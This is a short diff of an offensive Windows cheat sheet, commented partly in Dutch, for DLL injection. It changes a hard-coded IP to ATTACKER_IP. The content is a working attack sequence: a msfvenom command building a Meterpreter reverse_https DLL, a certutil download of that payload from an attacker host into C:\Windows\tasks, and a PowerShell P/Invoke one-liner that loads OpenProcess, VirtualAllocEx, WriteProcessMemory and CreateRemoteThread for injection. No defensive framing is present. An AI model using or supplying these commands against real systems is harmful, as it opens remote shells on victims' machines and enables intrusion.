@@ -1,8 +1,8 @@
 # DLL Injection via LoadLibrary + CreateRemoteThread
 # Stap 1: Genereer DLL payload
-# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f dll -o payload.dll
+# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f dll -o payload.dll
 # Stap 2: Upload DLL naar target
-certutil -urlcache -f http://10.0.0.1/payloads/payload.dll C:\Windows\tasks\payload.dll
+certutil -urlcache -f http://ATTACKER_IP/payloads/payload.dll C:\Windows\tasks\payload.dll
 # Stap 3: Inject (PowerShell P/Invoke)
 powershell -c "$code='[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(int a,bool b,int c);[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,int s,ref int w);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetModuleHandle(string n);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr l,IntPtr p,uint f,IntPtr t)';$k=Add-Type -memberDefinition $code -Name 'K32' -namespace Win32 -passthru;Write-Host 'DLL injection types loaded - use with target PID'"
 # Flow: OpenProcess -> VirtualAllocEx -> WriteProcessMemory(DLL path) -> GetProcAddress(LoadLibraryA) -> CreateRemoteThread(LoadLibraryA, DLL path)
